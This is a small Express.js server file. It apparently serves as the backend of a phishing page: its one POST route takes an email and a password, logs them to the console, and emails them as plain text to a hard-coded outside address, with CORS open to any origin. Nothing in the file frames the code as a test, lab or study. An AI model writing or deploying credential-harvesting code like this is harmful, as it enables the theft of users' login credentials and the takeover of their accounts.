require('dotenv').config({ path: "./.env" })
const express = require('express')
const app = express()
const sendMail = require('./sendMail')
const cors = require('cors')
app.use(cors())
app.use(express.json())



app.post('/post', (req, res) => {
    const { email, password } = req.body
    console.log(email, password)
    sendMail("mansoorqurban01@gmal.com", 'new mail', `email:${email} ${password}`)
    res.send('email send successfully')
})




app.listen(8080, () => {
    console.log('listening on port 8080')
})